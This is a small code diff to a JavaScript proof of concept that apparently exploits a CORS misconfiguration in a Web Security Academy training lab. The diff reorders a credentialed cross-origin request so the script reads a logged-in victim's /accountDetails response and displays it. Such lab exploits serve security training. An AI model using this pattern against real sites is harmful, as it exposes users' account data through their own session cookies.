@@ -11,6 +11,9 @@ function reqListener() {
 
 function cors() {
   var xhr = new XMLHttpRequest();
+  xhr.open("GET", "https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails", true);
+  xhr.withCredentials = true;
+  xhr.send();
   xhr.onreadystatechange = function() {
     if (this.status == 200) {
       document.getElementById("report").innerHTML = alert(this.responseText);
@@ -19,7 +22,4 @@ function cors() {
       document.getElementById("report").innerHTML = "Error";
     }
   };
-  xhr.open("GET", "https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails", true);
-  xhr.withCredentials = true;
-  xhr.send();
 }
